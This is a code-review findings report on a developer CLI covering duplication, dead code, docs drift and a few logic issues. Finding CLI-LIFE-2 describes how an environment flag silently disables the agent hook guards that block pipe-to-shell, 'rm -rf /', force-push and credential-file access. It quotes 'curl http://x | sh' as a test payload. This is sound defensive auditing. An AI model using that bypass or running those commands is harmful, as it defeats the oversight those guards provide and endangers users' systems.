**Problem.** The design spec (l.129) and the Codex `--output-schema` enum include `fix`. `parseGardenResponse` accepts it, and `validateGardenResponse` carries roughly 100 lines (`checkFix`, `FIX_FORBIDDEN`, `headerBlocks`, `singleLine`) to validate it. The prompt contract the model actually receives lists only `hub` and `related`. `selectGardenTargets` returns only `gaps` and `isolated`, so no `fix` target set exists, and the model is never shown lint findings or the keys it may change. The `fix` branch is therefore unreachable except by a model emitting a kind the prompt never describes. The schema description tells it that `fix` repairs an existing note, so it can do that, and the result is a `fix_out_of_scope` rejection. Alternatively, if the fix design was dropped, the validator code and the schema enum are dead weight on a security-sensitive path.

**Evidence.**

```
bundle.ts:36 `'`{"proposals":[{"kind":"hub"|"related","target":"<content-relative path>","note":"<full note text>"}]}`'`. select.ts return type `GardenTargetsV1 = { gaps, isolated }`. output-schemas.ts:42 embeds `"enum": ["hub", "related", "fix"]` and "fix repairs an existing note". garden/validate.ts:272 `function checkFix(...)`, l.470-477 `const allowed = ... finding.key ...; if (current === null) return "fix_out_of_scope"`. Spec: docs/superpowers/specs/2026-09-30-developer-os-brain-gardener-pulse-design.md:129,186.
```

**Fix.** Decide one way. Either (a) finish the feature by selecting `fix` targets from lint findings with a key, listing those keys in the bundle, and adding `fix` to the INSTRUCTIONS text. Or (b) remove `fix` from `GardenProposalKindV1`, `KINDS`, the schema enum, `checkFix` and its helpers, and amend the spec.

**Validation.** Prompt-contract test: every kind accepted by `parseGardenResponse` appears in `buildGardenPrompt` output, and every kind in `templates/schemas/garden.proposals.schema.json` is accepted by the validator and offered by the prompt.

**Verifier (downgraded).** Confirmed. bundle.ts INSTRUCTIONS (l.36-49) describe only hub and related. The bundle passes no lint findings or keys, and selectGardenTargets returns only gaps and isolated. Meanwhile proposal.ts:1/14 and validate.ts:263-292 and 470-477 accept and validate `fix`, and spec §3.3 step 4 and §4 promise it. No BACKLOG or NEW-134 entry records the gap. Nothing produces wrong output: a `fix` is either never emitted or is validated fail-closed. So this is an unfinished or unreachable feature path at low severity, not a medium flow defect.

### BRAIN-5 · inconsistency · Index records `occurrences: 0` for notes that omit the key, but the schema and architecture doc define the default as 1 and the minimum as 1

`packages/brain/src/indexes/build.ts:534`

**Problem.** docs/architecture/brain.md §6.1 says the key is an `occurrences >= 1` integer "defaulting to 1". `NOTE_KEY_RULES` says "an integer of at least 1", and the parser rejects 0. `toEntry` and `asIndexed` (garden/validate.ts) both write 0 when the key is absent, so `index.json` holds a value the schema itself calls invalid. The staleness threshold (>= 3) hides this today, but any consumer that treats the index as schema-valid (a future `occurrences >= 2` rule, or the index excerpt) sees a different value from the contract. Changing the default would change every existing index byte-for-byte, so this is a drift decision to make deliberately.

**Evidence.**

```
build.ts:534 `occurrences: front.occurrences ?? 0,`. garden/validate.ts (`asIndexed`) `occurrences: front.occurrences ?? 0,`. schema/note.ts:101 `occurrences: { required: false, rule: "an integer of at least 1" }`. docs/architecture/brain.md:181 `optional integer occurrences >= 1 defaulting to 1`.
```

**Fix.** Pick one. Either change both sites to `?? 1` (a one-time index-drift reindex for existing vaults), or amend brain.md §6.1 and the schema rule to say the index records 0 for an absent key.

**Validation.** Test that a note without `occurrences` indexes to the documented default. Run `brain lint` on a vault built before the change and confirm the drift finding is expected and cleared by `reindex`.

**Verifier (confirmed).** Verified. build.ts:534 and garden/validate.ts:600 both use `front.occurrences ?? 0`. schema/note.ts:101 and 489-493 require an integer of at least 1, and brain.md:181 says "optional integer occurrences >= 1 defaulting to 1"; the templates also write `occurrences: 1`. The only consumer is the staleness threshold (>= 3) at lint.ts:765, so there is no behaviour impact today. This is real contract drift at low severity.

### BRAIN-6 · docs-drift · The reference note `init` seeds into every vault says reindex is the only command that writes to the vault

`apps/cli/src/commands/brain-template.ts:56`

**Problem.** The embedded template (and its source, templates/brain/content/TOOLS/example-reference-note.md:19) tells users that `brain reindex` "is the only command that writes to this vault". `ingest` creates notes, `brain refactor` and `brain retire` mutate and move notes, `capture` and `review` write quarantine files, and `brain garden` automation writes captures. The note is indexed and searchable, so it is retrieved as authoritative text. It also lists only reindex, lint, search and status, omitting retire and refactor. Which commands write is a security-relevant statement.

**Evidence.**

```
apps/cli/src/commands/brain-template.ts:56 `... rebuilds the four generated files under\n  `content/_indexes/`. It is the only command that writes to this vault.` BrainSubcommand at apps/cli/src/commands/brain.ts:79 is `"reindex" | "lint" | "search" | "status" | "retire" | "refactor"`. `git grep -n "only command that writes"` returns only the template and its source file.
```

**Fix.** Reword to "is the only `brain` subcommand that regenerates `content/_indexes/`; `refactor` and `retire` change notes through a reviewed plan". Update templates/brain and the embedded copy together; `brain-template.test.ts` pins them equal.

**Validation.** `brain-template.test.ts` passes with both copies updated. Grep finds no "only command that writes" remaining.

**Verifier (confirmed).** Verified verbatim in both apps/cli/src/commands/brain-template.ts:56 and templates/brain/content/TOOLS/example-reference-note.md: "It is the only command that writes to this vault." That is false given ingest, refactor/retire and the capture/review quarantine writes, and the note is seeded into every vault and indexed. The impact is misleading user-facing text only, so low is correct.

### BRAIN-9 · docs-drift · Architecture doc's package map omits five directories and calls service.ts the only module the CLI imports

`docs/architecture/brain.md:25`

**Problem.** §1's directory table lists schema, discovery, indexes, lint, retrieval, migrations, redact.ts and service.ts. It omits capture/, review/, ingest/, garden/ and refactor/. It claims `src/service.ts` is "the only module the CLI imports", but apps/cli imports `buildCapture`, `parseCaptureFile`, `planRefactor`, `validateProposal`, `topicOfFolder`, `PRIVATE_FOLDERS` and more from the package root, in 26 import statements. Section 2's "It writes no capture" is true only of `schema/capture.ts`. A reader following "Read this before changing Brain code" would treat most of the package as nonexistent. The lint row also says "six classes" while `LintClass` has eight.

**Evidence.**

```
brain.md:25 `| `src/service.ts` | `BrainService`, the only module the CLI imports |`, l.21 `the six classes below`. lint/lint.ts:18-26 `LintClass` has frontmatter, provenance, links, duplicates, staleness, index-drift, isolated and gap. `git grep -n 'from "@developer-os/brain"' -- 'apps/cli/src/**'` returns 26 non-test hits, e.g. apps/cli/src/commands/capture.ts:18-24.
```

**Fix.** Add rows for capture/, review/, ingest/, garden/ and refactor/ (each: pure, no filesystem, CLI owns I/O). Replace "only module" with "the facade for index, lint, search and session context". Correct the lint class count.

**Validation.** Docs-only. Each `src/` directory is named in §1, and the class count equals `LintClass` members.

**Verifier (confirmed).** Verified. The brain.md:15-26 directory table omits capture/, review/, ingest/, garden/ and refactor/, all of which exist in packages/brain/src. Line 25 says service.ts is "the only module the CLI imports" while the CLI imports many root exports (e.g. isBrainMigrationPath, buildCapture). Line 21 says "six classes", but LintClass (lint.ts:18-26) and the doc's own table at l.95-104 have eight. Docs-only, low.

### CLI-CMD-10 · duplication · The reserved scheduled reason-code set is duplicated, with divergent fallback behaviour

`apps/cli/src/commands/brain.ts:401` · related: NEW-134

**Problem.** The set of reason codes a handler may not emit (`ok` plus the three inert outcomes) is written out as a literal in `brain.ts` and `handlers.ts`, and a third time as `INERT_OUTCOMES` in lifecycle/runtime-records.ts. The two command-side copies also behave differently on a hit: `brain.ts` falls back to the caller's outcome, while `handlers.ts` always maps to `handler_refused`. `pulse.ts` and `garden.ts` pass `LifecycleMutationRefusal.reason` into `reasonCode` with no reserved-code filter at all.

**Evidence.**

```
brain.ts:401 `const INERT_REASON_CODES: ReadonlySet<string> = new Set(["ok", "git_disabled", "automation_disabled", "skipped_lock_timeout"]);` ; automation/handlers.ts:15 `const RESERVED_REASON_CODES ... new Set(["ok", "git_disabled", "automation_disabled", "skipped_lock_timeout"]);` ; runtime-records.ts:97 `const INERT_OUTCOMES = ["git_disabled", "automation_disabled", "skipped_lock_timeout"]`; pulse.ts:170 `reasonCode: error.reason`.
```

**Fix.** Export one `isReservedReasonCode` (or the set) from runtime-records.ts, next to `INERT_OUTCOMES`, and use it in brain.ts, handlers.ts, pulse.ts and garden.ts.

**Validation.** `grep -rn '"skipped_lock_timeout"' apps/cli/src` (non-test) shows one literal set; the scheduled-handler tests stay green.

**Verifier (confirmed).** The same 4-literal set appears at brain.ts:401 (INERT_REASON_CODES) and automation/handlers.ts:15 (RESERVED_REASON_CODES), and runtime-records.ts:97 has INERT_OUTCOMES. pulse.ts:170 passes error.reason directly. The behavioural divergence is minor: brain.ts maps to its caller's fallback (handler_refused/handler_failed), while handlers.ts always uses handler_refused. This is mostly duplication; low severity holds.

### CLI-CMD-11 · docs-drift · Usage text omits `brain reindex` from the `--dry-run` command list

`apps/cli/src/main.ts:83`

**Problem.** The usage block is the CLI's primary help surface. It lists `--dry-run` as valid for init, uninstall, import, project init, brain retire and brain refactor. `BRAIN_SUBCOMMANDS.reindex` also admits `dry-run`, and `runBrain` implements it, so a user reading `--help` never learns that `brain reindex --dry-run` exists.

**Evidence.**

```
main.ts:83 `--dry-run        show the plan without changing anything (init, uninstall, import, project init, brain retire, brain refactor)` vs main.ts:209 `reindex: { options: ["dry-run", "json"], positionals: 0 }` and brain.ts:148 `if (dryRun) { return success({ ... transactionId: null`.
```

**Fix.** Add `brain reindex` to the parenthesised list in the `--dry-run` usage line.

**Validation.** A usage snapshot or test asserts the `--dry-run` line names `brain reindex`.

**Verifier (confirmed).** The --dry-run usage line at main.ts:83 lists init, uninstall, import, project init, brain retire and brain refactor. main.ts:209 BRAIN_SUBCOMMANDS.reindex admits 'dry-run', and brain.ts:148 implements it. The help text omits brain reindex.

### CLI-CMD-12 · duplication · `readStdin` and `readStdinBytes` are the same bounded-read loop written twice

`apps/cli/src/bin.ts:82`

**Problem.** Both functions run the same TTY check, chunk loop, byte count and early break; `readStdin` differs only in a fixed bound and a UTF-8 decode. A fix to chunk handling or the empty-stream rule has to be applied twice. Note `readStdin` returns the whole buffer (over the bound by up to one chunk) while `readStdinBytes` trims to `limit + 1`, an unintended asymmetry.

**Evidence.**

```
bin.ts:95-101 `for await (const chunk of process.stdin as AsyncIterable<unknown>) { const bytes = asBytes(chunk); chunks.push(bytes); size += bytes.byteLength; if (size > MAX_CAPTURE_INPUT_BYTES) break; } return chunks.length === 0 ? null : Buffer.concat(chunks).toString("utf8");` and bin.ts:108-114 the identical loop with `limit`.
```

**Fix.** Implement `readStdin` as `readStdinBytes(MAX_CAPTURE_INPUT_BYTES)` followed by a UTF-8 decode (null in, null out), keeping the contract that a length over the bound is visible to `capture`.

**Validation.** The existing capture oversize-stdin tests pass, and a piped input of exactly bound+1 bytes is still refused.

**Verifier (confirmed).** bin.ts:82-101 readStdin and bin.ts:103-115 readStdinBytes contain the same TTY check and bounded chunk loop. They differ only in the bound, the UTF-8 decode, and readStdinBytes's subarray(0, limit + 1) trim, which readStdin lacks. Real duplication with a small asymmetry; low.

### CLI-CMD-3 · duplication · The ENOENT/ENOTDIR predicate is reimplemented in about 12 places beside an exported canonical one, and one copy has already diverged

`apps/cli/src/config-file.ts:6`

**Problem.** `config-file.ts` exports `isMissingEntry` (ENOENT or ENOTDIR). The same body is copy-pasted privately across the commands, and `capture.ts` has silently narrowed to ENOENT only, so the same concept is classified differently by command. Several commands also import `readConfigFile` through the `doctor.js` re-export instead of `config-file.js`, pulling the 2000-line doctor module into the dependency graph of `config`, `status` and `brain`.

_Merged CLI-LIFE-4 (apps/cli/src/lifecycle/uninstall.ts:1862): Path-containment and missing-entry helpers are re-implemented in several files of this area although shared ones exist._

_Merged CLI-UPD-2 (apps/cli/src/update/recovery.ts:55): Parent-path helper copied six times in update/ and weaker than the core version._

**Evidence.**

```
Private copies: commands/quarantine.ts:42, review.ts:145, ingest.ts:469, import.ts:123, untrusted-file.ts:59, project-init.ts:82, automation/garden.ts:95, refactor.ts:93 (`isMissing`), uninstall.ts:106 (`isMissing`). Diverged: capture.ts:404-410 `error.code === "ENOENT"` only. Canonical: config-file.ts:6-13. `grep -rn "from \"./doctor.js\"" apps/cli/src/commands/{config,status,brain}.ts` shows `readConfigFile` imported via doctor.
```

**Fix.** Import `isMissingEntry` from `../config-file.js` in each command and delete the local copies. Decide on ENOTDIR for `capture` deliberately, since an ancestor that is a file is already caught by the `isDirectory` branch. Point `readConfigFile` imports at `config-file.js` directly.

**Validation.** `grep -rn "function isMissing" apps/cli/src/commands` returns nothing; `tsc -b` and the existing command tests stay green.

**Verifier (confirmed).** config-file.ts:6 exports isMissingEntry (ENOENT|ENOTDIR). Private copies exist in quarantine, review, ingest, import, untrusted-file, project-init, garden, refactor (isMissing) and uninstall (isMissing), plus more in bootstrap/ and lifecycle/. capture.ts:404-410 checks ENOENT only. config.ts:33 and brain.ts:23 import readConfigFile from ./doctor.js, and status.ts:14 imports it in a multi-line import. This is real duplication; impact is low.

### CLI-CMD-4 · inconsistency · `admitV2Home` and `withGlobalLock` exist in three command modules, and `config`'s copy classifies the in-flight-mutation home differently

`apps/cli/src/commands/git/index.ts:22`

**Problem.** `config.ts`, `automation/index.ts` and `git/index.ts` each carry their own `admitV2Home` and the `.lifecycle.lock` path literal (and `git`/`automation` their own `withGlobalLock`). `config.ts` handles `manifest_absent_with_global_lock` by re-classifying under the lock (`reclassifyUnderGlobalLock`) so a mutation in flight is not misreported. `git` and `automation` treat every non-`v2` kind as `manifest_absent`, so `git status` or `automation enable` during an in-flight lifecycle mutation reports 'manifest absent' while `config get` reports success. A fourth variant lives in lifecycle/uninstall-recovery.ts:104.

**Evidence.**

```
git/index.ts:26 and automation/index.ts:41 `if (home.kind !== "v2") throw new V2HomeAdmissionError("manifest_absent", [context.paths.manifestFile]);` vs config.ts:85 `if (home.kind === "manifest_absent_with_global_lock" && !(await reclassifyUnderGlobalLock(context, lifecycle)))`. Lock literal: `grep -rn '\.lifecycle\.lock' apps/cli/src --include=*.ts` lists config.ts:41, git/index.ts:36, automation/index.ts:51 plus about 10 more.
```

**Fix.** Extract one `admitV2Home(context)` and `withGlobalLock(context, lifecycle, work)` into `lifecycle/admission.ts` or `mutation-gate.ts`, built on config.ts's re-classifying version, and export the lock-leaf constant once. Have config, git and automation import them.

**Validation.** Add a test for `git status` and `automation status` on a home with the global lock held and no manifest, expecting the same outcome as `config get`. Existing git, automation and config suites stay green.

**Verifier (downgraded).** Verified: git/index.ts:22-28 and automation/index.ts:37-43 throw manifest_absent for every non-v2 kind, while config.ts:85 re-classifies manifest_absent_with_global_lock under the lock. withGlobalLock and the '.lifecycle.lock' literal are duplicated. The divergence only applies in the transient window while a lifecycle mutation holds the lock on a manifest-less home (for example, an init in flight). There git/automation refuse with manifest_absent and the user can retry, so nothing is corrupted. That is an inconsistency, not medium-severity wrong behaviour.

### CLI-CMD-5 · inconsistency · `brain` and `project init` hand-build failures with unredacted `paths`, bypassing the path-scope redaction every other command gets from `failureFrom`

`apps/cli/src/commands/brain.ts:388`

**Problem.** `failureFrom` redacts every entry of `paths` in the `path` scope (NEW-39) before it is published. The `BrainRefusal` catch in `runBrain` and the `ProjectInitRefusal` catch in `runProjectInit` call `failure()` directly and publish `error.paths` verbatim, redacting only `message` and `recovery`. For `brain lint`, those paths are note filenames from the vault, which are user or agent content. `refactor.ts` handles the same `BrainRefusal` through `failureFrom`, so the same refusal is redacted via `brain refactor` and not via `brain lint`.

**Evidence.**

```
brain.ts:388-395 `return failure(error.code, { kind: "brain_refusal", message: context.guards.redactDiagnostic(error.message), paths: error.paths, ...` ; project-init.ts:285-291 `paths: error.paths,`. Versus context.ts:520 `paths: paths.map((path) => redact(path, "path"))` and refactor.ts:344-352 passing the same `BrainRefusal` through `failureFrom`.
```

**Fix.** brain.ts: replace the hand-built `failure()` with `failureFrom(context, error, error.paths, error.recovery)`; `kindOf("BrainRefusal")` already yields `brain_refusal` and `exitCodeOf` reads `error.code`. project-init.ts: map `error.paths` through `guards.redactDiagnostic(path, "path")` (its `kind` is carried on the error, so keep `failure()` but redact).

**Validation.** A test creates a note whose filename contains a built-in-pattern token, runs `brain lint --json` with an error finding, and asserts the token is absent from `error.paths`. `brain.test.ts` and `project-init.test.ts` otherwise unchanged.

**Verifier (confirmed).** brain.ts:388-395 and project-init.ts:285-291 build failure() with paths: error.paths unredacted, while context.ts:520 failureFrom applies redact(path, 'path'). The runLint refusal (brain.ts:245-250) carries note paths from vault findings, so a filename that matches a built-in pattern is published raw in error.paths while the same text is redacted in the message. The refactor.ts claim is loosely stated: brain.ts's BrainRefusal is not exported, and refactor duck-types carried.paths. The inconsistency itself holds.

### CLI-CMD-7 · duplication · The 'durable key or ephemeral random key' redactor construction is repeated in four commands

`apps/cli/src/commands/project-check.ts:115`

**Problem.** `project check`, `project init`, `import --dry-run` and `git` each build a redactor from `readRedactionKey(stateDir) ?? randomBytes(N)` plus the config's user patterns. The fallback size is a bare `32` in three places and `REDACTION_KEY_BYTES` in the fourth, so a change to the key size or to the fallback policy has to be made four times.

**Evidence.**

```
project-check.ts:115 `createRedactor(readRedactionKey(context.paths.stateDir) ?? randomBytes(32), {`; project-init.ts:195-198 `readRedactionKey(paths.stateDir) ?? randomBytes(REDACTION_KEY_BYTES)`; import.ts:569-571 `readRedactionKey(paths.stateDir) ... (existingKey ?? randomBytes(32))`; git/service.ts:494 `createRedactor(readRedactionKey(context.paths.stateDir) ?? randomBytes(32), {`.
```

**Fix.** Add `redactorWithoutCreatingKey(context, patterns)` to context.ts next to `readRedactionKey`, using `REDACTION_KEY_BYTES`, and call it from the four sites.

**Validation.** `grep -rn "?? randomBytes" apps/cli/src/commands` returns nothing; project-check, project-init, import and git suites stay green.

**Verifier (confirmed).** Verified: project-check.ts:115, git/service.ts:494 and import.ts:571 use `?? randomBytes(32)`, project-init.ts:196 uses REDACTION_KEY_BYTES, and context.ts:751 does the same thing again. REDACTION_KEY_BYTES = 32 is exported from context.ts:76. This is real duplication of the key-size fallback policy; low impact.

### CLI-CMD-8 · logic · `git sync` with a pending push is reported through a generic failure that drops the transaction id and head oid

`apps/cli/src/commands/git/index.ts:81` · related: NEW-137

**Problem.** `service.sync` returns exit code 6 together with typed data `{kind:"sync", outcome:"push_pending", transactionId, headOid}`. `runGit` discards that data and emits a fixed `push_pending` failure carrying only the product home path, so `--json` consumers get neither id, although the scheduled path (handlers.ts:40) does keep `data`. The same non-success branch in `runAutomation` is unreachable: the automation service returns only `EXIT_CODES.success`.

**Evidence.**

```
git/service.ts:1930 and :2043 `exitCode: outcome === "finalized" ? EXIT_CODES.success : EXIT_CODES.recoveryRequired, data: { kind: "sync", outcome: ... "push_pending", transactionId: ..., headOid }`; git/index.ts:81-86 `return failure(result.exitCode, { kind: "push_pending", message: ..., paths: [context.paths.home], recovery: "developer-os git sync" })`. automation/service.ts has `exitCode:` only at :1153 and :1192, both `EXIT_CODES.success`, so automation/index.ts:89 `failure(result.exitCode, { kind: "automation_failed"...` cannot run.
```

**Fix.** In `runGit`, route the non-success arm through `failureFrom` or `failure` with `data` set to `redactPayload` of `{transactionId, headOid}`. Delete the unreachable `automation_failed` arm, or narrow `AutomationCommandResultV1.exitCode` to the success literal so the compiler enforces it.

**Validation.** A git sync test with a push forced to stay pending asserts `--json` `error.data.transactionId` is set. Removing the automation arm compiles under `tsc -b`.

**Verifier (confirmed).** git/service.ts:1930-1931 returns recoveryRequired with data {kind:'sync', outcome:'push_pending', transactionId, headOid}. git/index.ts:79-85 discards it and emits a fixed push_pending failure with only paths [home]. automation/service.ts sets exitCode only at :1153 and :1192, both EXIT_CODES.success, so automation/index.ts:89's automation_failed arm cannot run today. NEW-137 is about host Git transport, not this data loss, so this is not a duplicate.

### CLI-CMD-9 · inconsistency · The `--yes` rationale says every verb accepts one vocabulary, but `capture` and `review` reject `--yes`

`apps/cli/src/commands/ingest.ts:191`

**Problem.** The `assumeYes` docblock justifies the inert flag as accepted 'so that a script driving the whole pipeline non-interactively passes one vocabulary to every verb rather than discovering that one of the three refuses it'. `COMMAND_OPTIONS` allows `yes` for `ingest` only, so `capture --yes` and `review --yes` are usage errors. A script that passes `--yes` to all three, as the comment promises, fails on two of them.

**Evidence.**

```
ingest.ts:191-200 `--yes. Accepted and inert: ingest never asks a question ... which is why capture and review prompt for nothing either. The flag is accepted so that a script ... passes one vocabulary to every verb`; main.ts:165-167 `capture: ["text", "json", "note"], review: ["id", "decision", "status", "json"], ingest: ["limit", "json", "yes", "agent"]`. `grep -n assumeYes apps/cli/src/commands/ingest.ts` shows only the declaration at :200.
```

**Fix.** Either add `yes` to the `capture` and `review` allow-lists as inert, matching the comment, or delete the flag from `ingest` and correct the comment, since `assumeYes` has no reader.

**Validation.** A parse test asserts `capture --yes` and `review --yes` have the same accept or reject outcome as `ingest --yes`.

**Verifier (confirmed).** ingest.ts:190-199 says the flag is accepted so a script 'passes one vocabulary to every verb rather than discovering that one of the three refuses it'. main.ts:165-166 COMMAND_OPTIONS has no 'yes' for capture or review, so `capture --yes` and `review --yes` are usage errors. The comment's rationale contradicts the parser.

### CLI-LIFE-2 · security · An ambient environment flag turns off every fail-closed guard, including `command`, `commit` and `path`

`apps/cli/src/hooks/entry.ts:102`

**Problem.** `runHookMode` returns 0 (allow) before argv parsing when `DEVELOPER_OS_HOOK_ACTIVE === "1"` in the hook process's environment. The flag exists only to stop recursion from tsc and formatter children (`HOOK_CHILD_ENV`), but it is read for every verb. That includes the three closed security guards, which otherwise fail closed. The hook process inherits the vendor CLI's environment, so anything that can set that variable for the Claude or Codex process disables `guard command` (pipe-to-shell, `rm -rf /`), `guard commit` (`--no-verify`, force-push) and `guard path` (credential files) silently. Examples are a project `.claude/settings.json` `env` block, a direnv-style launcher, or a subagent. No firing record is written, since `fired` stays null. This is the environment-flag-backdoor pattern, and the threat model does not list it as a residual.

**Evidence.**

```
entry.ts:102: `if (environment?.env.DEVELOPER_OS_HOOK_ACTIVE === "1") return 0;` child.ts:6: `export const HOOK_CHILD_ENV = Object.freeze({ DEVELOPER_OS_HOOK_ACTIVE: "1" });` hooks.md §3.5: "Every verb that finds the marker returns `allow`." git grep shows no other reader of the variable.
```

**Fix.** Apply the marker only to the open verbs that can recurse (`stop`, `format`, `edit`, `prompt`, `inject`). Evaluate `command`, `commit` and `path` regardless, because tsc and prettier children never spawn a vendor session that fires them. Alternatively bind the marker to the spawning hook (a per-run random token or the parent pid) instead of a static `1`. Record the residual in hooks.md if the bypass stays.

**Validation.** Add a test where env has `DEVELOPER_OS_HOOK_ACTIVE=1` and a `guard command` payload of `curl http://x | sh` must still return exit 2. Keep the existing assertions that child processes receive the marker.

**Verifier (downgraded).** Confirmed: entry.ts:102 returns 0 for every verb when `DEVELOPER_OS_HOOK_ACTIVE` is "1", before argv parsing. That includes the fail-closed `command`, `commit` and `path` guards. hooks.md §3.5 documents this as intended ("Every verb that finds the marker returns `allow`"), and threat-model.md does not list it as a residual. The marginal attack surface is small, though. A Bash tool `export` does not reach hook processes, because the vendor process spawns them. Any actor who can set env for the vendor process, through a project settings `env` block or the launching shell, can already turn hooks off in other ways, for example with settings-level hook disabling or by editing the hook config. The real gap is the undocumented residual plus the fact that the marker check is not limited to the verbs that recurse. Low, not medium.

### CLI-LIFE-5 · dead-code · redactionKeyStatePlanHash and the HOOK_VENDORS export have no production reader

`apps/cli/src/lifecycle/redaction-key.ts:165` · removal confidence: medium

**Problem.** `redactionKeyStatePlanHash` is exported and referenced only by codecs.test.ts, so it is never called in production. Core's `HOOK_VENDORS` is referenced only by the index export test, because the CLI re-declares the vendor list (see CLI-LIFE-3). `HOOK_EVENT_OF` and `OUTCOME_MAPS` carry a vendor dimension whose two rows are identical (`claude: PASCAL_CASE_EVENTS, codex: PASCAL_CASE_EVENTS`; `{block: 2, advise: 2}` for both), so the per-vendor lookup does nothing today.

**Evidence.**

```
`git grep -nw redactionKeyStatePlanHash -- apps packages` returns only redaction-key.ts:165 (definition) and codecs.test.ts:41,497,503. `git grep -n HOOK_VENDORS -- apps packages` returns only core hooks/contract.ts, core index.ts and core index.test.ts:28. firing-records.ts:31-34 and outcome.ts:41-44 have identical vendor rows.
```

**Fix.** Delete `redactionKeyStatePlanHash` and its domain constant together with the pinning test, unless a later task consumes the hash. Use `HOOK_VENDORS` in argv.ts (CLI-LIFE-3) so it gains a reader. Optionally collapse the identical per-vendor maps to one constant, keeping the vendor parameter only if a divergence is planned.

**Validation.** `git grep -nw redactionKeyStatePlanHash` returns nothing after removal, and tsc -b and eslint stay green.

**Verifier (confirmed).** Verified. `git grep -nw redactionKeyStatePlanHash` shows only the definition at redaction-key.ts:165 and codecs.test.ts:41,497,503. Non-test grep shows REDACTION_KEY_STATE_PLAN_HASH_DOMAIN used only inside that function. Core's HOOK_VENDORS has no non-test reader outside contract.ts and the index.ts re-export. One nuance: the opt-in-surfaces spec (2026-08-21, line ~2043) requires this plan hash. The rollback participant's equivalent (`rollbackPayloadStatePlanHash`) is consumed in rollback.ts, so this could be a missing wiring rather than removable code. Removal confidence is medium at most. The identical per-vendor map rows are a weak point, because the vendor dimension is part of a contract that the parity test exercises.

### CLI-UPD-1 · dead-code · updateClosurePort is never called; apply-ports.ts reimplements it inline

`apps/cli/src/update/apply.ts:111` · removal confidence: high

**Problem.** The exported `updateClosurePort` is documented as "the production `closure` port", but the production composer in apply-ports.ts builds the same closure port inline. The documented helper is dead and the real code is a copy of it, so the two can drift.

_Merged FLOW-UPD-5 (apps/cli/src/update/apply.ts:111): `updateClosurePort` is never used; the production closure port is a separate inline copy._

**Evidence.**

```
apply.ts:111 `export function updateClosurePort(lifecycle, key, residue) { return async () => (await lifecycle.inspectClosureV2(key, residue)).closure; }`. apply-ports.ts:1108-1111 `closure: async () => { const { key, residue } = await ledger(); return (await lifecycle().inspectClosureV2(key, residue)).closure; }`. Grep: `grep -rn updateClosurePort apps packages tests --include=*.ts` returns only the definition at apply.ts:111, with no importer, no test and no doc reference.
```

**Fix.** Delete `updateClosurePort` from apply.ts. If the docstring is worth keeping, move it onto the inline `closure` port in apply-ports.ts.

**Validation.** Run `grep -rn updateClosurePort apps packages tests` (expect zero hits), then `tsc -b`.

**Verifier (confirmed).** apply.ts:111 defines exported updateClosurePort. A repo-wide grep over .ts and .md (excluding node_modules) finds only that definition. apply-ports.ts:1108-1111 builds the same closure port inline from ledger() and inspectClosureV2. No BACKLOG row covers it. This is dead code with high removal confidence.

### CLI-UPD-3 · duplication · Executor-record size limit 16_384 hardcoded in three CLI sites although core exports it

`apps/cli/src/update/recovery.ts:202`

**Problem.** Core exports `MAXIMUM_RECOVERY_EXECUTOR_BYTES = 16_384`, and core validates staged rows against it. The CLI repeats the literal in `readUpdateExecutorRecord` (twice) and in the compose descriptor. If core changes the limit, the compose descriptor, the recovery reader and the core plan validation can disagree. A record the reader refuses is then reported as exit 6 evidence even though core accepted it.

**Evidence.**

```
recovery.ts:202 `BigInt(entry.size) > 16_384n`. recovery.ts:205 `fs.readRegular(entry, 16_384)`. compose.ts:1930 `maximumRecordBytes: 16_384`. packages/core/src/update/construction.ts:395 `export const MAXIMUM_RECOVERY_EXECUTOR_BYTES = 16_384;`, re-exported at packages/core/src/update/index.ts:294. Grep `MAXIMUM_RECOVERY_EXECUTOR_BYTES` in apps/ returns no hits.
```

**Fix.** Import `MAXIMUM_RECOVERY_EXECUTOR_BYTES` from `@developer-os/core` in recovery.ts and compose.ts and use it at all three sites.

**Validation.** Run `tsc -b`. Add a grep check that no `16_384` literal remains in apps/cli/src/update outside tests.

**Verifier (confirmed).** Verified that recovery.ts:202 uses `16_384n`, recovery.ts:205 uses `readRegular(entry, 16_384)` and compose.ts:1930 sets `maximumRecordBytes: 16_384`. Core exports MAXIMUM_RECOVERY_EXECUTOR_BYTES (construction.ts:395, index.ts:294) and uses it at construction.ts:946, but nothing under apps/ imports it. Core repeats the literal itself in coordinator.ts:234 and lifecycle/ledger-v2.ts:87, so the drift risk is wider than the finding reports. The values agree today, so this is a maintainability issue only. Not in BACKLOG.

### CLI-UPD-4 · duplication · sameJson defined twice within update/ with identical bodies

`apps/cli/src/update/planning.ts:232`

**Problem.** `sameJson` is exported from apply.ts, which rollback-apply.ts imports. planning.ts keeps its own private copy, and bootstrap/report.ts and several core modules carry more copies. Two helpers with the same name and the same body in one directory invite divergence in a comparison that gates `update_plan_changed` and `update_state_changed`.

**Evidence.**

```
planning.ts:232-233 `function sameJson(left: unknown, right: unknown): boolean { return encodeCanonicalJson(left as CanonicalJsonValue) === encodeCanonicalJson(right as CanonicalJsonValue); }`. apply.ts:106-107 is the same body. Other copies: bootstrap/report.ts:262, core update/owner.ts:72, core update/coordinator.ts:294.
```

**Fix.** Keep a single `sameJson` in core, or in a small canonical-json helper for the CLI, and import it in apply.ts, planning.ts and bootstrap/report.ts. If apply.ts keeps the export, have planning.ts import it, unless that creates an import cycle (planning.ts is already imported by apply.ts and rollback-apply.ts).

**Validation.** Run `tsc -b`, then the apply.test.ts and planning.test.ts cases that assert `update_plan_changed`.

**Verifier (confirmed).** planning.ts:232 has a private sameJson whose body matches the exported sameJson at apply.ts:106. More copies exist at apps/cli/src/commands/git/service.ts:237, core git/planner.ts:300 and core git/effect-journal.ts:166. planning.ts does not import from apply, but apply imports planning, so the fix should move the helper into a shared module rather than import it from apply.ts. The bodies are identical, so this is pure duplication with no current behavioral drift. Not in BACKLOG.

### CORE-LIFE-2 · duplication · Guard helpers are copy-pasted across lifecycle modules and have already drifted

`packages/core/src/lifecycle/foundation-compaction.ts:20` · fixed in 242d4c9b; this line is the post-fix code, the import of the shared `requireHeldGlobalLock` from `packages/core/src/lifecycle/coordinator.ts:199` (re-pointed 2026-10-07, NEW-193)

